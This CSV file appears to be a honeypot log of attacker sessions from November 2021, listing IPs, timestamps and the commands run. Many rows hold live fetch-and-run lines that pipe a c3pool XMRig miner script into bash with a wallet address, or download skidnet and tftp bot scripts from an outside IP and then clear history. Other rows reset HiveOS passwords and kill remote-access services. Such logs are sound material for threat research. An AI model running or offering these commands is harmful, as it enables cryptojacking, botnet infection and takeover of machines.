attackdate,attackerip,entrancetime,exittime,commands
2021-11-17,10.0.3.158,10:40:02.280,10:48:48.834,"[""uname -a;lspci | grep -i --color 'vga\\|3d\\|2d';curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr""]"
2021-11-18,10.0.3.116,10:39:18.829,11:00:01.515,['scp -t /tmp/SMlyZvTU']
2021-11-16,10.0.3.251,11:12:55.349,11:30:01.411,['scp -t /tmp/bUzBFwIw']
2021-11-17,10.0.3.101,11:05:59.602,11:30:01.029,"['sudo hive-passwd f5123', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
2021-11-26,10.0.3.125,11:24:43.267,11:25:10.262,[]
2021-11-17,10.0.3.48,11:43:54.657,11:58:08.718,"[""uname -a;lspci | grep -i --color 'vga\\|3d\\|2d';curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr""]"
2021-11-18,10.0.3.117,11:45:03.305,11:45:04.109,"['sudo hive-passwd c3Rvcnl0aW1lIGRheW9uZSBhbmQgZGF5dHdevbase64', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
2021-11-17,10.0.3.185,12:07:39.873,12:21:40.910,"[""uname -a;lspci | grep -i --color 'vga\\|3d\\|2d';curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr""]"
2021-11-18,10.0.3.191,12:10:02.840,12:27:33.212,"['sudo hive-passwd f5123', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
2021-11-16,10.0.3.73,12:41:08.892,12:54:34.539,[]
2021-11-17,10.0.3.249,12:49:45.367,13:00:01.765,"[""uname -a;lspci | grep -i --color 'vga\\|3d\\|2d';curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr""]"
2021-11-18,10.0.3.248,12:52:00.706,13:00:01.535,[]
2021-11-16,10.0.3.123,13:22:24.214,13:22:26.129,[]
2021-11-17,10.0.3.50,13:13:26.908,13:27:24.721,"[""uname -a;lspci | grep -i --color 'vga\\|3d\\|2d';curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr""]"
2021-11-18,10.0.3.159,13:03:01.518,13:28:13.483,[]
2021-11-16,10.0.3.195,13:51:46.742,14:00:01.415,"['sudo hive-passwd c3Rvcnl0aW1lIGRheW9uZSBhbmQgZGF5dHdevbase64', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
2021-11-17,10.0.3.166,13:41:07.778,13:59:11.960,"[""uname -a;lspci | grep -i --color 'vga\\|3d\\|2d';curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr""]"
2021-11-18,10.0.3.236,13:44:47.614,13:44:48.775,[]
2021-11-19,10.0.3.254,13:44:27.243,13:45:30.093,['uname -s -v -n -r -m']
2021-11-17,10.0.3.161,14:18:03.186,14:30:01.530,"['sudo hive-passwd c3Rvcnl0aW1lIGRheW9uZSBhbmQgZGF5dHdevbase64', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
2021-11-16,10.0.3.123,14:44:54.359,14:51:26.802,"['cd /tmp || cd /var/run || cd /mnt || cd /root || cd /', 'wget http://172.105.119.145/skidnet.sh', 'chmod 777 *', 'sh skidnet.sh', 'tftp -g 172.105.119.145 -r tftp1.sh', 'chmod 777 *', 'sh tftp1.sh', 'rm -rf *.sh', 'history -c']"
2021-11-17,10.0.3.6,14:47:31.859,15:00:01.059,"['sudo hive-passwd c3Rvcnl0aW1lIGRheW9uZSBhbmQgZGF5dHdevbase64', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
2021-11-27,10.0.3.40,14:59:59.273,14:59:59.736,['scp -t /tmp/uSKVBvBa']
2021-11-16,10.0.3.100,15:18:31.771,15:18:32.553,"['sudo hive-passwd c3Rvcnl0aW1lIGRheW9uZSBhbmQgZGF5dHdevbase64', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
2021-11-17,10.0.3.98,15:10:51.587,15:10:53.775,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
2021-11-18,10.0.3.53,15:18:47.614,15:29:47.466,"[""uname -a;lspci | grep -i --color 'vga\\|3d\\|2d';curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr""]"
